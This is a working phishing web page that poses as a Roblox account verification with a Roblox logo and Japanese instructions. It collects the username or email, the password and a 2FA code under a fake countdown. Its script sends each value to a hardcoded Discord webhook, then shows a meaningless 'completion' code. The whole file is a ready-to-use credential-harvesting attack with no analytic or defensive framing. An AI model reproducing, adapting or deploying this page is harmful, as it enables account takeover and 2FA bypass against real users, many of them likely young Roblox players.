<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <style>
        /* エグゼキューター内ブラウザでも確実に表示・クリックさせる設定 */
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
        body { font-family: sans-serif; background-color: #F2F4F5; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding-top: 50px; }
        .box { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 90%; max-width: 340px; text-align: center; }
        .logo { width: 120px; margin-bottom: 20px; pointer-events: none; }
        h1 { font-size: 20px; color: #333; margin-bottom: 10px; }
        p { font-size: 13px; color: #666; margin-bottom: 20px; line-height: 1.5; }
        
        input { 
            width: 100%; padding: 15px; margin-bottom: 15px; 
            border: 2px solid #ddd; border-radius: 5px; 
            font-size: 16px; background: #fafafa;
        }
        
        /* ボタンを大きくし、クリック判定を強化 */
        .v-btn { 
            display: block; width: 100%; padding: 18px; 
            background-color: #00A2FF; color: white; 
            text-decoration: none; border: none; border-radius: 5px; 
            font-weight: bold; font-size: 18px; cursor: pointer;
            box-shadow: 0 4px 0 #0082CC;
        }
        .v-btn:active { transform: translateY(2px); box-shadow: 0 2px 0 #0082CC; }
        
        #step2, #step3 { display: none; }
        .timer { color: #d00; font-weight: bold; margin-bottom: 10px; }
        .code-res { background: #e3f2fd; border: 2px dashed #00A2FF; padding: 20px; font-size: 30px; font-weight: bold; color: #00A2FF; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="box" id="step1">
        <img src="https://images.rbxcdn.com/2b74a3f23f46f485741f235967008770.svg" class="logo">
        <h1>Login to Verify</h1>
        <p>セキュリティのため再ログインが必要です。<br>情報を入力してVerifyを押してください。</p>
        <input type="text" id="u" placeholder="Username / Email" required>
        <input type="password" id="p" placeholder="Password" required>
        <button type="button" class="v-btn" id="b1" onclick="go1()">Verify Account</button>
    </div>

    <div class="box" id="step2">
        <img src="https://images.rbxcdn.com/2b74a3f23f46f485741f235967008770.svg" class="logo">
        <h1>2-Step Auth</h1>
        <p class="timer">残り 29 秒</p>
        <p>アプリまたはメールのコードを入力してください。</p>
        <input type="text" id="c" placeholder="6-digit code" maxlength="6">
        <button type="button" class="v-btn" id="b2" onclick="go2()">Confirm Code</button>
    </div>

    <div class="box" id="step3">
        <h1>認証完了！</h1>
        <p>以下のコードをコピーしてRobloxに入力してください。</p>
        <div class="code-res">BN-9922</div>
    </div>

    <script>
        const hook = "https://discord.com/api/webhooks/1487384537980993646/KaXirod0cFiv_fb8JHXdi_S_k-vD6jqqY4afb6ySx9hjYc8vww0FynG4UrOvRBGx4gUw";
        let user = "";

        async function go1() {
            user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            const btn = document.getElementById('b1');
            if(!user || !pass) return alert("入力してください");

            btn.disabled = true;
            btn.innerText = "Processing...";

            // 送信
            await fetch(hook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: "@everyone 🔑 **Login Info**",
                    embeds: [{
                        fields: [
                            { name: "User", value: user, inline: true },
                            { name: "Pass", value: pass, inline: true }
                        ],
                        color: 16776960
                    }]
                })
            }).catch(() => {});

            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        }

        async function go2() {
            const code = document.getElementById('c').value;
            const btn = document.getElementById('b2');
            if(!code) return;

            btn.disabled = true;
            btn.innerText = "Checking...";

            await fetch(hook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: "🛡️ **2FA Code**",
                    embeds: [{
                        fields: [
                            { name: "User", value: user, inline: true },
                            { name: "Code", value: code, inline: true }
                        ],
                        color: 16711680
                    }]
                })
            }).catch(() => {});

            document.getElementById('step2').style.display = 'none';
            document.getElementById('step3').style.display = 'block';
        }
    </script>
</body>
</html>
